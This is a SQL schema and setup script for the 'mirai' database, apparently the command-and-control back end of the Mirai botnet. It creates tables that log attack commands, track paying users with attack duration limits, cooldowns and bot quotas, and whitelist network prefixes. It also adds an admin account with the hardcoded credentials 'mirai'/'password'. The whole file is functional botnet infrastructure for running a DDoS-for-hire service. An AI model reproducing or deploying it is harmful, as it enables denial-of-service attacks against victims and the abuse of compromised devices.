CREATE DATABASE IF NOT EXISTS mirai;
USE mirai;

CREATE TABLE IF NOT EXISTS `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);

CREATE TABLE IF NOT EXISTS `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);

CREATE TABLE IF NOT EXISTS `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);

CREATE USER IF NOT EXISTS 'mirai'@'localhost' IDENTIFIED BY 'password';
CREATE USER IF NOT EXISTS 'mirai'@'127.0.0.1' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON mirai.* To 'mirai'@'localhost';
GRANT ALL PRIVILEGES ON mirai.* To 'mirai'@'127.0.0.1';

INSERT IGNORE INTO users VALUES (NULL, 'mirai', 'password', 0, 0, 0, 0, -1, 1, 30, '');
